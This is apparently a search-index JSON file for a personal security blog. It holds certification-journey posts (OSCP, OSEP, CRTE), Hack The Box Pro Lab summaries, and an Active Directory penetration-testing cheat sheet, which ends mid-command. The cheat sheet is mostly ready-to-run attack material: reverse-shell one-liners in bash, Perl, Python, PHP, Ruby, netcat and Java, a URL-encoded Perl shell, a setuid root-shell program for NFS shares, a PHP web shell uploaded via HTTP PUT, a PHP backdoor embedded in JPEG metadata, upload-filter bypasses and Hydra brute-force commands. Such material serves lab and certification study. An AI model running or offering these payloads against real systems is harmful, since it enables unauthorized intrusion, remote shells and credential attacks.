{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome-to-cuhawks-blog","title":"Welcome to Cuhawk's Blog","text":""},{"location":"#introduction","title":"Introduction","text":"<p>Hello! I am Cuhawk, also known as Soural. This blog chronicles my journey through bug bounty hunting, cybersecurity, and game development. Here, you'll find insights into my projects, methodologies, and learning paths.</p>"},{"location":"#current-projects-and-interests","title":"Current Projects and Interests","text":"<ul> <li>Bug Bounty Hunting: Active on HackerOne, BugCrowd, and Synack.</li> <li>Game Development: Developing a chess game engine in C++ with SFML.</li> <li>Certifications: Pursuing Burp Suite Certified Practitioner and Red Team Ops, alongside OSCP, OSEP, and CRTE.</li> <li>Learning: Exploring Go for DevOps, C# for web development, and C++ for game development and DSA.</li> </ul>"},{"location":"#profiles-and-connections","title":"Profiles and Connections","text":"<ul> <li>HackTheBox</li> <li>HackerOne</li> <li>BugCrowd</li> <li>LeetCode</li> </ul>"},{"location":"#what-youll-find-here","title":"What You\u2019ll Find Here","text":"<ul> <li>Bug Bounty Work: Insights into my bug hunting experiences and methodologies.</li> <li>Development Projects: Detailed looks at my game development and security tools.</li> <li>Certifications Journey: Updates and resources on my certification pursuits.</li> <li>Learning Path: Experiences and tips on learning new technologies.</li> </ul> <p>Enjoy your visit to my blog, where passion meets expertise in cybersecurity and development!</p>"},{"location":"certifications/crte/","title":"CRTE","text":""},{"location":"certifications/crte/#my-journey-to-passing-the-certified-red-team-expert-crte","title":"My Journey to Passing the Certified Red Team Expert (CRTE)","text":"<p>Embarking on the journey to achieve the Certified Red Team Expert (CRTE) certification was a transformative experience that honed my skills in red teaming and Windows Active Directory exploitation. Here\u2019s a recount of my path to success.</p>"},{"location":"certifications/crte/#understanding-the-lab-and-course-structure","title":"Understanding the Lab and Course Structure","text":"<p>The Windows Red Team Lab by Altered Security is meticulously designed to replicate real-world attack-defense scenarios. The course begins with a non-admin user account and progresses towards gaining enterprise admin access across multiple forests. Key learning areas included:</p> <ul> <li>Active Directory enumeration</li> <li>Local and forest privilege escalation</li> <li>Network pivoting</li> <li>Application allowlisting bypass</li> <li>Kerberos delegation issues</li> <li>SQL Servers and forest trusts</li> <li>Azure hybrid identity</li> </ul>"},{"location":"certifications/crte/#preparation-and-study","title":"Preparation and Study","text":"<ol> <li>Lab Access and Course Material: </li> <li>I opted for the 90-day lab access package which included 14+ hours of video content, course slides, and two comprehensive lab manuals. </li> <li> <p>The video courses with English captions were invaluable for understanding complex concepts.</p> </li> <li> <p>Hands-On Practice: </p> </li> <li>The lab environment, featuring fully patched Server 2019 machines, provided a realistic setting for practicing attacks and defenses.</li> <li> <p>I focused on abusing Active Directory and Windows features, simulating active user scenarios, and exploring modern adversary attack paths.</p> </li> <li> <p>Resources and Tools: </p> </li> <li>The dual lab manuals, one for standalone tools and the other for command and control (C2) solutions, were crucial for navigating different attack vectors.</li> <li>Walk-through videos helped in resolving particularly challenging tasks.</li> </ol>"},{"location":"certifications/crte/#certification-exam","title":"Certification Exam","text":"<p>The certification exam was a comprehensive test of all the skills and knowledge acquired during the course. It required not just technical prowess but also the ability to think like an adversary and adapt strategies on the fly. The emphasis on understanding defenses and their bypasses was particularly challenging yet rewarding.</p>"},{"location":"certifications/crte/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Thorough Understanding of AD: Gaining deep insights into Active Directory exploitation and defenses.</li> <li>Practical Experience: The hands-on lab work provided practical experience that theoretical study alone could not offer.</li> <li>Adaptability: Learning to adapt and use various tools and techniques depending on the scenario was a critical skill developed through this course.</li> </ul>"},{"location":"certifications/crte/#conclusion","title":"Conclusion","text":"<p>Achieving the CRTE certification was a rigorous yet incredibly rewarding experience. It has significantly enhanced my capabilities in red teaming and prepared me for advanced security challenges. For anyone looking to advance their career in cybersecurity, especially in red teaming, the CRTE certification from Altered Security is an excellent investment. You can verify my Credential HERE.</p> <p></p>"},{"location":"certifications/oscp/","title":"OSCP","text":""},{"location":"certifications/oscp/#my-journey-to-passing-the-oscp","title":"My Journey to Passing the OSCP","text":""},{"location":"certifications/oscp/#introduction","title":"Introduction","text":"<p>The Offensive Security Certified Professional (OSCP) certification is highly regarded in the cybersecurity community. It requires not only technical knowledge but also the ability to think like a hacker. Here, I will detail my journey to passing the OSCP, including preparation, the challenges faced, and tips that helped me succeed.</p>"},{"location":"certifications/oscp/#preparation-phase","title":"Preparation Phase","text":""},{"location":"certifications/oscp/#1-understanding-the-requirements","title":"1. Understanding the Requirements","text":"<p>Before diving into the study material, I thoroughly reviewed the OSCP exam objectives. This helped me understand the scope of what I needed to learn and set realistic expectations for myself.</p>"},{"location":"certifications/oscp/#2-setting-up-a-study-plan","title":"2. Setting Up a Study Plan","text":"<p>I created a detailed study plan, allocating specific time slots each day for learning and practice. My plan included: - Weekdays: 2 hours of study/practice - Weekends: 4-6 hours of focused practice - Milestones: Weekly goals to cover specific topics or complete a certain number of practice machines</p>"},{"location":"certifications/oscp/#study-resources","title":"Study Resources","text":""},{"location":"certifications/oscp/#1-offensive-security-pwk-course","title":"1. Offensive Security PWK Course","text":"<p>The Penetration Testing with Kali Linux (PWK) course material provided by Offensive Security was my primary resource. It covered: - Information gathering - Vulnerability scanning - Exploitation - Post-exploitation - Reporting</p> <p>I made sure to go through each module meticulously, completing all exercises and labs provided.</p>"},{"location":"certifications/oscp/#2-supplementary-resources","title":"2. Supplementary Resources","text":"<p>To reinforce my learning, I used additional resources: - Books: \"The Hacker Playbook\" series by Peter Kim, \"Metasploit: The Penetration Tester's Guide\" - Online Platforms: Hack The Box, VulnHub - Forums and Blogs: Offensive Security forums, NetSecFocus OSCP Study Group on Discord</p>"},{"location":"certifications/oscp/#practical-practice","title":"Practical Practice","text":""},{"location":"certifications/oscp/#1-lab-environment","title":"1. Lab Environment","text":"<p>The PWK labs provided by Offensive Security were invaluable. They simulated a real-world network environment with various machines to exploit. I aimed to root as many machines as possible, focusing on understanding different types of vulnerabilities and exploits.</p>"},{"location":"certifications/oscp/#2-practice-machines","title":"2. Practice Machines","text":"<p>Platforms like Hack The Box and VulnHub offered a variety of machines that mimicked the OSCP exam environment. I practiced extensively on these platforms, ensuring I could exploit machines within the exam\u2019s 24-hour time limit.</p>"},{"location":"certifications/oscp/#key-challenges-and-how-i-overcame-them","title":"Key Challenges and How I Overcame Them","text":""},{"location":"certifications/oscp/#1-time-management","title":"1. Time Management","text":"<p>Balancing study with work and personal life was challenging. I overcame this by: - Sticking strictly to my study schedule - Breaking down large tasks into smaller, manageable chunks - Taking regular breaks to avoid burnout</p>"},{"location":"certifications/oscp/#2-technical-difficulties","title":"2. Technical Difficulties","text":"<p>Some exploits were particularly challenging. My approach was: - Deep diving into the exploit code to understand its workings - Researching online for similar vulnerabilities and exploits - Seeking help from forums and study groups</p>"},{"location":"certifications/oscp/#3-mental-resilience","title":"3. Mental Resilience","text":"<p>The journey was mentally taxing. To stay motivated: - I kept reminding myself of my end goal - Celebrated small victories, like rooting a difficult machine - Connected with other OSCP aspirants for mutual support</p>"},{"location":"certifications/oscp/#the-exam-day","title":"The Exam Day","text":"<p>The OSCP exam is a 24-hour practical test where you need to exploit a series of machines to accumulate at least 70 points out of 100.</p>"},{"location":"certifications/oscp/#1-preparation","title":"1. Preparation","text":"<ul> <li>Ensured a stable internet connection</li> <li>Had backup plans for technical issues (e.g., multiple ISPs)</li> <li>Prepared snacks and drinks to avoid interruptions</li> </ul>"},{"location":"certifications/oscp/#2-strategy","title":"2. Strategy","text":"<ul> <li>Started with the easiest machines to secure quick points</li> <li>Documented every step meticulously, as the exam requires detailed reporting</li> <li>Took short breaks to stay fresh and maintain focus</li> </ul>"},{"location":"certifications/oscp/#post-exam-the-report","title":"Post-Exam: The Report","text":"<p>The final step was to submit a detailed report of all exploits used. My report included: - Step-by-step documentation of how each machine was exploited - Screenshots to support my findings - An executive summary and conclusion</p>"},{"location":"certifications/oscp/#tips-for-aspiring-oscp-candidates","title":"Tips for Aspiring OSCP Candidates","text":"<ol> <li>Master the Basics: Strong understanding of TCP/IP, networking, and Linux is crucial.</li> <li>Practice, Practice, Practice: Hands-on experience is key. Use lab environments and platforms like Hack The Box.</li> <li>Stay Organized: Keep notes and document all your learning and practice sessions.</li> <li>Join Communities: Study groups and forums can provide support and valuable insights.</li> <li>Don't Give Up: The journey is tough but rewarding. Persistence is critical.</li> </ol>"},{"location":"certifications/oscp/#finally","title":"Finally","text":"<p>Passing the OSCP was a significant milestone in my cybersecurity career. It required dedication, extensive practice, and a strategic approach. By following a structured study plan, leveraging multiple resources, and maintaining resilience, I was able to achieve my goal. I hope my journey provides valuable insights and motivation for others aspiring to earn this prestigious certification. You can verify my certification HERE</p> <p></p>"},{"location":"certifications/osep/","title":"OSEP","text":""},{"location":"certifications/osep/#my-journey-to-passing-osep","title":"My Journey to Passing OSEP","text":""},{"location":"certifications/osep/#introduction","title":"Introduction","text":"<p>Embarking on the Offensive Security Experienced Penetration Tester (OSEP) certification was one of the most challenging yet rewarding experiences of my professional career. This certification, provided by Offensive Security, is designed to train and certify individuals in advanced penetration testing techniques. Here, I will share my journey, the strategies I employed, the challenges I faced, and the triumphs I achieved.</p>"},{"location":"certifications/osep/#why-i-chose-osep","title":"Why I Chose OSEP","text":"<p>After completing the OSCP (Offensive Security Certified Professional), I was looking for the next step to deepen my expertise in penetration testing. OSEP stood out due to its focus on evading defenses and advanced attack techniques, which are crucial skills for a penetration tester. The allure of mastering these skills and the recognition that comes with OSEP certification motivated me to take on this challenge.</p>"},{"location":"certifications/osep/#preparation","title":"Preparation","text":""},{"location":"certifications/osep/#prerequisites","title":"Prerequisites","text":"<p>Before starting the OSEP course, I ensured I had a solid foundation in the following areas: - Advanced knowledge of networking and operating systems. - Proficiency in scripting languages, particularly Python and Bash. - Prior experience with penetration testing tools and methodologies. - Understanding of Active Directory and Windows internals.</p>"},{"location":"certifications/osep/#course-material","title":"Course Material","text":"<p>I began by thoroughly studying the course material provided by Offensive Security: - PEN-300 Courseware: This included comprehensive PDFs and a series of videos. I made it a point to read every word and watch every video, taking detailed notes along the way. - Lab Environment: The PEN-300 lab environment was crucial for hands-on practice. I dedicated a significant amount of time to practicing each lab exercise, ensuring I understood every concept and technique.</p>"},{"location":"certifications/osep/#study-plan","title":"Study Plan","text":"<p>To manage my study efficiently, I devised a structured plan: 1. Daily Study Routine: I committed to 3-4 hours of study every day, with more intensive sessions on weekends. 2. Hands-On Practice: Theory is essential, but hands-on practice was my priority. I spent 70% of my study time in the lab environment. 3. Note-Taking: I maintained a detailed notebook with summaries of techniques, commands, and scripts. 4. Review and Revise: Regularly revisiting previous topics helped reinforce my learning and ensure I retained critical information.</p>"},{"location":"certifications/osep/#key-topics-and-techniques","title":"Key Topics and Techniques","text":""},{"location":"certifications/osep/#initial-access","title":"Initial Access","text":"<p>I focused on various initial access techniques, including: - Phishing and social engineering. - Exploiting web application vulnerabilities. - Custom payloads and obfuscation techniques.</p>"},{"location":"certifications/osep/#lateral-movement","title":"Lateral Movement","text":"<p>Understanding lateral movement was crucial: - Abusing Windows protocols and services (SMB, WMI, RDP). - Exploiting misconfigurations in Active Directory. - Developing and using custom tools for stealthier lateral movement.</p>"},{"location":"certifications/osep/#evasion-techniques","title":"Evasion Techniques","text":"<p>Bypassing defenses required in-depth knowledge of: - AV and EDR evasion techniques. - Utilizing various obfuscation methods for scripts and binaries. - Creating and modifying custom malware.</p>"},{"location":"certifications/osep/#challenges-faced","title":"Challenges Faced","text":"<p>The journey was not without its challenges: - Time Management: Balancing study with work and personal life was difficult. Sticking to a strict schedule was essential. - Complex Topics: Advanced topics like AV evasion and Active Directory exploitation were particularly challenging. I had to revisit these topics multiple times. - Mental Fatigue: The intensity of the study sometimes led to burnout. Taking short breaks and ensuring adequate rest helped me stay focused.</p>"},{"location":"certifications/osep/#exam-preparation","title":"Exam Preparation","text":""},{"location":"certifications/osep/#final-review","title":"Final Review","text":"<p>In the weeks leading up to the exam, I focused on: - Revisiting all course material and lab exercises. - Practicing with retired machines from platforms like Hack The Box and TryHackMe. - Participating in Capture The Flag (CTF) competitions to refine my skills.</p>"},{"location":"certifications/osep/#exam-strategy","title":"Exam Strategy","text":"<p>During the exam: - I maintained a calm and focused mindset. - Carefully documented every step to ensure I had a clear record of my actions. - Prioritized tasks based on their point value and my confidence in completing them.</p>"},{"location":"certifications/osep/#triumph-and-certification","title":"Triumph and Certification","text":"<p>Finally, after hours of grueling work, I submitted my report and waited for the results. The moment I received the email confirming my success was incredibly fulfilling. All the hard work, late nights, and perseverance had paid off.</p>"},{"location":"certifications/osep/#conclusion","title":"Conclusion","text":"<p>Passing the OSEP was a monumental achievement in my career. It not only validated my skills but also significantly enhanced my capabilities as a penetration tester. For anyone considering the OSEP certification, my advice is to stay dedicated, practice relentlessly, and never hesitate to revisit challenging topics. The journey may be tough, but the rewards are immense.</p>"},{"location":"certifications/osep/#acknowledgments","title":"Acknowledgments","text":"<p>I extend my gratitude to Offensive Security for their comprehensive course and lab environment, and to the cybersecurity community for their endless resources and support. This journey has been one of growth and learning, and I look forward to applying these skills in real-world scenarios. You can verify my Credential HERE</p> <p></p>"},{"location":"certifications/prolabs/","title":"HTB ProLabs","text":""},{"location":"certifications/prolabs/#detailed-exploration-of-hack-the-box-pro-labs-certifications-learnings-and-difficulty-levels","title":"Detailed Exploration of Hack The Box Pro Labs: Certifications, Learnings, and Difficulty Levels","text":""},{"location":"certifications/prolabs/#1-cybernetics","title":"1. Cybernetics","text":"<ul> <li>Overview: A highly advanced lab designed to challenge seasoned cybersecurity professionals.</li> <li>Key Learnings:<ul> <li>Advanced Active Directory Exploitation: Techniques for attacking complex AD environments.</li> <li>Phishing Techniques: Crafting and deploying phishing campaigns to gain initial access.</li> <li>Lateral Movement: Navigating across a network after initial compromise.</li> <li>Privilege Escalation: Elevating access to higher privileges within a system.</li> <li>Situational Awareness: Understanding the environment to adapt strategies accordingly.</li> </ul> </li> <li>Environment: Simulates a hardened enterprise network with mature security practices.</li> <li>Difficulty: High, suitable for experts with extensive experience in penetration testing and red teaming.</li> </ul>"},{"location":"certifications/prolabs/#2-aptlabs","title":"2. APTLabs","text":"<ul> <li>Overview: Designed for the most advanced penetration testers, simulating sophisticated APT attacks.</li> <li>Key Learnings:<ul> <li>Bypassing Security Features: Techniques to bypass 2FA and other advanced security mechanisms.</li> <li>Non-CVE Exploitation: Exploiting vulnerabilities without relying on known CVEs.</li> <li>Lateral Movement and Persistence: Maintaining access within a compromised network.</li> </ul> </li> <li>Environment: Mimics a highly secure enterprise with advanced security measures.</li> <li>Difficulty: Very high, aimed at those looking for the ultimate red teaming challenge.</li> </ul>"},{"location":"certifications/prolabs/#3-offshore","title":"3. Offshore","text":"<ul> <li>Overview: Focuses on realistic enterprise environments with an emphasis on comprehensive network penetration testing.</li> <li>Key Learnings:<ul> <li>Active Directory Enumeration: Identifying and exploiting weaknesses in AD configurations.</li> <li>Endpoint Evasion: Techniques to avoid detection by endpoint security solutions.</li> <li>Web Attacks and Tunneling: Exploiting web applications and establishing covert channels.</li> </ul> </li> <li>Environment: Represents a typical corporate network with common and advanced security measures.</li> <li>Difficulty: High, providing a thorough test of both red team and penetration testing skills.</li> </ul>"},{"location":"certifications/prolabs/#4-zephyr","title":"4. Zephyr","text":"<ul> <li>Overview: An intermediate lab focusing on a range of penetration testing skills.</li> <li>Key Learnings:<ul> <li>Active Directory Flaws: Identifying and exploiting common AD misconfigurations.</li> <li>SQL Attacks: Exploiting SQL injection vulnerabilities.</li> <li>Privilege Escalation: Techniques for elevating privileges on compromised machines.</li> </ul> </li> <li>Environment: Simulates a moderately protected enterprise network.</li> <li>Difficulty: Moderate, ideal for those looking to build on foundational red teaming skills.</li> </ul>"},{"location":"certifications/prolabs/#5-dante","title":"5. Dante","text":"<ul> <li>Overview: Geared towards beginners and intermediates, covering essential penetration testing techniques.</li> <li>Key Learnings:<ul> <li>Enumeration: Gathering information about systems and networks.</li> <li>Exploit Development: Creating and deploying exploits for identified vulnerabilities.</li> <li>Web Application Attacks: Attacking web applications to gain unauthorized access.</li> </ul> </li> <li>Environment: Provides a simpler environment suitable for learning core penetration testing methodologies.</li> <li>Difficulty: Beginner-friendly, a good starting point for those new to professional penetration testing.</li> </ul>"},{"location":"certifications/prolabs/#6-rastalabs","title":"6. RastaLabs","text":"<ul> <li>Overview: Focuses on intermediate red teaming skills with a particular emphasis on Active Directory.</li> <li>Key Learnings:<ul> <li>Active Directory Exploitation: Techniques for compromising AD environments.</li> <li>Endpoint Evasion: Avoiding detection by various endpoint security mechanisms.</li> <li>Phishing and Exploit Development: Crafting phishing campaigns and developing custom exploits.</li> </ul> </li> <li>Environment: Represents a moderately complex enterprise network.</li> <li>Difficulty: Moderate, providing a balanced challenge for those looking to enhance their red teaming abilities.</li> </ul>"},{"location":"pentesting/","title":"Active Directory Pentest","text":""},{"location":"pentesting/#reconnaissance-enumeration","title":"Reconnaissance / Enumeration","text":""},{"location":"pentesting/#extracting-live-ips-from-nmap-scan","title":"Extracting Live IPs from Nmap Scan","text":"<pre><code>nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep \"/open\" | cut -d \" \" -f 2 &gt; exposed-services-ips\n</code></pre>"},{"location":"pentesting/#simple-port-knocking","title":"Simple Port Knocking","text":"<pre><code>for x in 7000 8000 9000; do nmap -Pn \u2013host_timeout 201 \u2013max-retries 0 -p $x 1.1.1.1; done\n</code></pre>"},{"location":"pentesting/#dns-lookups-zone-transfers-brute-force","title":"DNS lookups, Zone Transfers &amp; Brute-Force","text":"<pre><code>whois domain.com\ndig {a|txt|ns|mx} domain.com\ndig {a|txt|ns|mx} domain.com @ns1.domain.com\nhost -t {a|txt|ns|mx} megacorpone.com\nhost -a megacorpone.com\nhost -l megacorpone.com ns1.megacorpone.com\ndnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com\ndnsenum domain.com\nnslookup -&gt; set type=any -&gt; ls -d domain.com\nfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep \"has.address\";done\n</code></pre>"},{"location":"pentesting/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>nc -v $TARGET 80\ntelnet $TARGET 80\ncurl -vX $TARGET\n</code></pre>"},{"location":"pentesting/#nfs-exported-shares","title":"NFS Exported Shares","text":"<p>List NFS exported shares:</p> <pre><code>showmount -e 192.168.110.102\n</code></pre> <p>...and check if <code>'rw,no_root_squash'</code> is present. If it is present, compile the below <code>sid-shell.c</code>:</p> <p>{% code title=\"sid-shell.c\" %} <pre><code>#include &lt;unistd.h&gt;\n\nmain( int argc, char ** argv, char ** envp )\n{\n    setgid(0); setuid(0); system(\"/bin/bash\", argv, envp);\n    return 0;\n}\n</code></pre> {% endcode %}</p> <p>...upload it to the share and execute the below to launch <code>sid-shell</code> to spawn a root shell:</p> <pre><code>chown root:root sid-shell; chmod +s sid-shell; ./sid-shell\n</code></pre>"},{"location":"pentesting/#kerberos-enumeration","title":"Kerberos Enumeration","text":"<pre><code># users\nnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'\n</code></pre>"},{"location":"pentesting/#http-brute-force-vulnerability-scanning","title":"HTTP Brute-Force &amp; Vulnerability Scanning","text":"<pre><code>target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster\ntarget=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto\ntarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum\n</code></pre>"},{"location":"pentesting/#rpc-netbios-smb","title":"RPC / NetBios / SMB","text":"<pre><code>rpcinfo -p $TARGET\nnbtscan $TARGET\n\n#list shares\nsmbclient -L //$TARGET -U \"\"\n\n# null session\nrpcclient -U \"\" $TARGET\nsmbclient -L //$TARGET\nenum4linux $TARGET\n</code></pre>"},{"location":"pentesting/#snmp","title":"SNMP","text":"<pre><code># Windows User Accounts\nsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25\n\n# Windows Running Programs\nsnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2\n\n# Windows Hostname\nsnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5\n\n# Windows Share Information\nsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1\n\n# Windows Share Information\nsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27\n\n# Windows TCP Ports\nsnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3\n\n# Software Name\nsnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2\n\n# brute-force community strings\nonesixtyone -i snmp-ips.txt -c community.txt\n\nsnmp-check $TARGET\n</code></pre>"},{"location":"pentesting/#smtp","title":"SMTP","text":"<pre><code>smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150\n</code></pre>"},{"location":"pentesting/#active-directory","title":"Active Directory","text":"<pre><code># current domain info\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# domain trusts\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n\n# current forest info\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\n\n# get forest trust relationships\n([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()\n\n# get DCs of a domain\nnltest /dclist:offense.local\nnet group \"domain controllers\" /domain\n\n# get DC for currently authenticated session\nnltest /dsgetdc:offense.local\n\n# get domain trusts from cmd shell\nnltest /domain_trusts\n\n# get user info\nnltest /user:\"spotless\"\n\n# get DC for currently authenticated session\nset l\n\n# get domain name and DC the user authenticated to\nklist\n\n# get all logon sessions. Includes NTLM authenticated sessions\nklist sessions\n\n# kerberos tickets for the session\nklist\n\n# cached krbtgt\nklist tgt\n\n# whoami on older Windows systems\nset u\n\n# find DFS shares with ADModule\nGet-ADObject -filter * -SearchBase \"CN=Dfs-Configuration,CN=System,DC=offense,DC=local\" | select name\n\n# find DFS shares with ADSI\n$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]\"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local\"; $s.FindAll() | % {$_.properties.name}\n\n# check if spooler service is running on a host\npowershell ls \"\\\\dc01\\pipe\\spoolss\"\n</code></pre>"},{"location":"pentesting/#listen-on-a-port-powershell","title":"Listen on a port (Powershell)","text":"<pre><code># Start listener on port 443\n$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();\n\nwhile($true)\n{\n    $client = $listener.AcceptTcpClient();\n    Write-Host $client.client.RemoteEndPoint \"connected!\";\n    $client.Close();\n    start-sleep -seconds 1;\n}\n</code></pre>"},{"location":"pentesting/#gaining-access","title":"Gaining Access","text":""},{"location":"pentesting/#reverse-shell-one-liners","title":"Reverse Shell One-Liners","text":""},{"location":"pentesting/#bash","title":"Bash","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n</code></pre>"},{"location":"pentesting/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre>"},{"location":"pentesting/#url-encoded-perl-linux","title":"URL-Encoded Perl: Linux","text":"<pre><code>echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew\n</code></pre>"},{"location":"pentesting/#python","title":"Python","text":"<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"pentesting/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre>"},{"location":"pentesting/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre>"},{"location":"pentesting/#netcat-without-e-1","title":"Netcat without -e #1","text":"<pre><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f\n</code></pre>"},{"location":"pentesting/#netcat-without-e-2","title":"Netcat without -e #2","text":"<pre><code>nc localhost 443 | /bin/sh | nc localhost 444\ntelnet localhost 443 | /bin/sh | telnet localhost 444\n</code></pre>"},{"location":"pentesting/#java","title":"Java","text":"<pre><code>r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[]); p.waitFor();\n</code></pre>"},{"location":"pentesting/#xterm","title":"XTerm","text":"<pre><code>xterm -display 10.0.0.1:1\n</code></pre>"},{"location":"pentesting/#jdwp-rce","title":"JDWP RCE","text":"<pre><code>print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(\"whoami\").getInputStream())).readLine())\n</code></pre>"},{"location":"pentesting/#working-with-restricted-shells","title":"Working with Restricted Shells","text":"<pre><code># rare cases\nssh bill@localhost ls -l /tmp\n</code></pre> <pre><code>nice /bin/bash\n</code></pre>"},{"location":"pentesting/#interactive-tty-shells","title":"Interactive TTY Shells","text":"<pre><code>/usr/bin/expect sh\n</code></pre> <pre><code>python -c \u2018import pty; pty.spawn(\u201c/bin/sh\u201d)\u2019\n# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk\npython -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([\"/bin/su\",\"-c\",\"id\",\"bynarr\"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"fruity\\n\");time.sleep(0.1);print os.read(master,1024);'\n</code></pre>"},{"location":"pentesting/#uploadingposting-files-through-www-upload-forms","title":"Uploading/POSTing Files Through WWW Upload Forms","text":"<pre><code># POST file\ncurl -X POST -F \"file=@/file/location/shell.php\" http://$TARGET/upload.php --cookie \"cookie\"\n\n# POST binary data to web form\ncurl -F \"field=&lt;shell.zip\" http://$TARGET/upld.php -F 'k=v' --cookie \"k=v;\" -F \"submit=true\" -L -v\n</code></pre>"},{"location":"pentesting/#puting-file-on-the-webhost-via-put-verb","title":"PUTing File on the Webhost via PUT verb","text":"<pre><code>curl -X PUT -d '&lt;?php system($_GET[\"c\"]);?&gt;' http://192.168.2.99/shell.php\n</code></pre>"},{"location":"pentesting/#generating-payload-pattern-calculating-offset","title":"Generating Payload Pattern &amp; Calculating Offset","text":"<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE\n</code></pre>"},{"location":"pentesting/#bypassing-file-upload-restrictions","title":"Bypassing File Upload Restrictions","text":"<ul> <li>file.php -&gt; file.jpg</li> <li>file.php -&gt; file.php.jpg</li> <li>file.asp -&gt; file.asp;.jpg</li> <li>file.gif (contains php code, but starts with string GIF/GIF98)</li> <li>00%</li> <li>file.jpg with php backdoor in exif (see below)</li> <li>.jpg -&gt; proxy intercept -&gt; rename to .php</li> </ul>"},{"location":"pentesting/#injecting-php-into-jpeg","title":"Injecting PHP into JPEG","text":"<pre><code>exiv2 -c'A \"&lt;?php system($_REQUEST['cmd']);?&gt;\"!' backdoor.jpeg\nexiftool \u201c-comment&lt;=back.php\u201d back.png\n</code></pre>"},{"location":"pentesting/#uploading-htaccess-to-interpret-blah-as-php","title":"Uploading .htaccess to interpret .blah as .php","text":"<pre><code>AddType application/x-httpd-php .blah\n</code></pre>"},{"location":"pentesting/#cracking-passwords","title":"Cracking Passwords","text":""},{"location":"pentesting/#cracking-web-forms-with-hydra","title":"Cracking Web Forms with Hydra","text":"<pre><code>hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list \"/endpoint/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage\" -s PORT -P /usr/share/wordlists/list\n</code></pre>"},{"location":"pentesting/#cracking-common-protocols-with-hydra","title":"Cracking Common Protocols with Hydra","text":"<pre><code>hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1\n</code></pre>"},{"location":"pentesting/#hashcat-cracking","title":"HashCat Cracking","text":"<pre><code># Bruteforce based on the pattern;\nhashcat -a3 